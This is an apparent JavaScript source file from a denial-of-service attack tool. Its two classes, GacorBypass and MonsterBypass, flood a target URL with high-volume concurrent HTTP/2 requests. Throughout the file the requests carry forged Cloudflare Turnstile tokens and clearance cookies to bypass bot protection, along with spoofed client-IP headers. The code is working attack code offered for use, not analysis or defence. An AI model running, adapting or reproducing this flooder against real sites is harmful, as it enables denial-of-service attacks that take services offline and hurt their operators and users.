import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * GACOR BYPASS - Method yang pasti work dan ngirim request
 */
export class GacorBypass {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 60, 300); // 60x multiplier
        this.userAgents = userAgents.length > 0 ? userAgents : [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        logger.info(`🔥 GACOR BYPASS initialized - Target: ${this.url.hostname}, RPC: ${this.rpc}`);
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        
        logger.info('🚀 GACOR BYPASS starting attack...');
        logger.info(`   Duration: ${this.duration}s, RPC per batch: ${this.rpc}`);

        let loopCount = 0;
        while (Date.now() < endTime && this.active) {
            loopCount++;
            logger.info(`🔄 Loop ${loopCount} - Sending ${this.rpc} requests...`);
            
            const waves = [];
            // 30 concurrent waves
            for (let i = 0; i < 30; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
            
            // Small delay to prevent overwhelming
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        logger.info(`✅ GACOR BYPASS finished - Total loops: ${loopCount}`);
    }

    async attack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            promises.push(this.sendGacorRequest());
        }

        await Promise.allSettled(promises);
    }

    async sendGacorRequest() {
        return new Promise((resolve) => {
            try {
                const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
                
                const headers = {
                    ':method': 'GET',
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.hostname,
                    ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `gacor=${Date.now()}&r=${Math.random()}`,
                    
                    'user-agent': userAgent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    
                    // CF bypass headers
                    'cf-turnstile-response': `0.${this.randomString(64)}.${this.randomString(32)}.${this.randomString(64)}`,
                    'cookie': `cf_clearance=${this.randomString(32)}-${Date.now()}; __cf_bm=${this.randomString(43)}`,
                    
                    // Spoofing headers
                    'cf-ray': `${this.randomString(16)}-SJC`,
                    'cf-connecting-ip': this.randomIPv4(),
                    'x-forwarded-for': this.randomIPv4(),
                    'x-real-ip': this.randomIPv4()
                };

                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`);

                client.on('error', (err) => {
                    logger.debug(`❌ Connection error: ${err.message}`);
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    REQUESTS_SENT.add(1);
                    
                    const status = responseHeaders[':status'];
                    if (status === 200 || status === 302 || status === 301) {
                        logger.debug(`✅ GACOR success! Status: ${status}`);
                    } else if (status === 403) {
                        logger.debug(`❌ Blocked: ${status}`);
                    } else if (status === 503 || status === 429) {
                        logger.debug(`⚠️  Rate limited: ${status}`);
                    } else {
                        logger.debug(`ℹ️  Response: ${status}`);
                    }
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', (err) => {
                    logger.debug(`❌ Request error: ${err.message}`);
                    client.close();
                    resolve();
                });

                req.setTimeout(5000, () => {
                    logger.debug('⏰ Request timeout');
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                logger.debug(`❌ Exception: ${error.message}`);
                resolve();
            }
        });
    }

    randomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    randomIPv4() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    stop() {
        this.active = false;
        logger.info('🛑 GACOR BYPASS stopped');
    }
}

/**
 * MONSTER BYPASS - Method yang lebih brutal
 */
export class MonsterBypass {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 100, 500); // 100x multiplier - MONSTER!
        this.userAgents = userAgents.length > 0 ? userAgents : [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Initialize gacor bypass
        this.gacorBypass = new GacorBypass(targetUrl, 1, 1, userAgents, referers, proxies);
        
        logger.info(`💀 MONSTER BYPASS initialized - Target: ${this.url.hostname}, RPC: ${this.rpc}`);
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        
        logger.info('💀 MONSTER BYPASS launching DESTRUCTION...');
        logger.info(`   Duration: ${this.duration}s, RPC per batch: ${this.rpc}`);

        let loopCount = 0;
        while (Date.now() < endTime && this.active) {
            loopCount++;
            logger.info(`💀 MONSTER Loop ${loopCount} - Sending ${this.rpc} requests...`);
            
            const waves = [];
            // 50 concurrent waves - MONSTER LEVEL
            for (let i = 0; i < 50; i++) {
                waves.push(this.monsterAttack());
            }
            await Promise.allSettled(waves);
            
            // Minimal delay
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        logger.info(`💀 MONSTER BYPASS finished - Total loops: ${loopCount}`);
    }

    async monsterAttack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            
            // Mix attack strategies
            if (i % 2 === 0) {
                promises.push(this.gacorBypass.sendGacorRequest());
            } else {
                promises.push(this.sendMonsterRequest());
            }
        }

        await Promise.allSettled(promises);
    }

    async sendMonsterRequest() {
        // Ultra fast monster request
        return new Promise((resolve) => {
            try {
                const headers = {
                    ':method': 'GET',
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.hostname,
                    ':path': this.url.pathname + `?monster=${Date.now()}`,
                    'user-agent': this.userAgents[0],
                    'cf-turnstile-response': `0.${this.randomString(64)}.${this.randomString(32)}.${this.randomString(64)}`
                };

                const client = http2.connect(`${this.url.protocol}//${this.url.hostname}`);
                
                client.on('error', () => {
                    client.close();
                    resolve();
                });

                const req = client.request(headers);

                req.on('response', () => {
                    REQUESTS_SENT.add(1);
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                });

                req.on('end', () => {
                    client.close();
                    resolve();
                });

                req.on('error', () => {
                    client.close();
                    resolve();
                });

                req.setTimeout(3000, () => {
                    req.close();
                    client.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    randomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    stop() {
        this.active = false;
        this.gacorBypass.stop();
        logger.info('💀 MONSTER BYPASS stopped');
    }
}
